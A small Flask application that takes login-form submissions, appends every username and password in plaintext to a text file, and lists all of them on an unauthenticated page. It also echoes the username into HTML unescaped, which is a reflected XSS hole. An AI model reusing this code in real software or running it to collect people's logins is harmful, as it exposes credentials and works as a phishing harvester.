from flask import Flask, request, render_template
import os

app = Flask(__name__)
DATA_FILE = 'users.txt'

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save to file
    with open(DATA_FILE, 'a') as f:
        f.write(f'{username},{password}\n')

    return f'Login submitted for {username}. <a href="/">Back</a>'

@app.route('/view-users')
def view_users():
    if not os.path.exists(DATA_FILE):
        return "No user data found."

    users = []
    with open(DATA_FILE, 'r') as f:
        for line in f:
            if ',' in line:
                username, password = line.strip().split(',', 1)
                users.append({'username': username, 'password': password})

    return render_template('users.html', users=users)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

